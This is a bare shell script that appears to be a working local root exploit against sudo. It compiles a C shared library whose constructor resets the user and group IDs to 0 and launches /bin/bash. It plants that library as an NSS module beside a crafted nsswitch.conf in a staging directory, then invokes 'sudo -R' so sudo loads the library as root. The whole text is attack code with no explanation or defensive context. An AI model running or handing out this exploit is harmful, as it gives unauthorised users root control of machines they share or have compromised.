cd /tmp
cat > woot1.5.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void woot(void) {
  setreuid(0,0); setregid(0,0);
  chdir("/");
  execl("/bin/bash","/bin/bash",NULL);
}
EOF
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX); cd "$STAGE"
mkdir -p woot/etc libnss_
echo "passwd: /woot1.5" > woot/etc/nsswitch.conf
cp /etc/group woot/etc 2>/dev/null
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1.5.so.2 /tmp/woot1.5.c
sudo -R woot woot
